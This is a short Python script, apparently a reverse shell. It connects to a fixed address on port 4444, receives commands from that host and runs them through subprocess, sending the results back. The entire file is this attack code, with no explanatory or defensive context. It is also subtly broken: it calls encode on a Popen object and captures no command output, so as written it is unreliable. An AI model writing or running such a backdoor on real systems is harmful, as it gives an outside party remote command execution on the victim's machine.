#!/usr/bin/python

import socket, subprocess

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
    connection.connect(("192.168.2.105", 4444))
    init = "[+] Connection established!!\n"
    init = init.encode()
    connection.send(init)

    while True:
        command = connection.recv(1024)
        command_result = subprocess.Popen(command.split()).encode()
        connection.send(command_result)
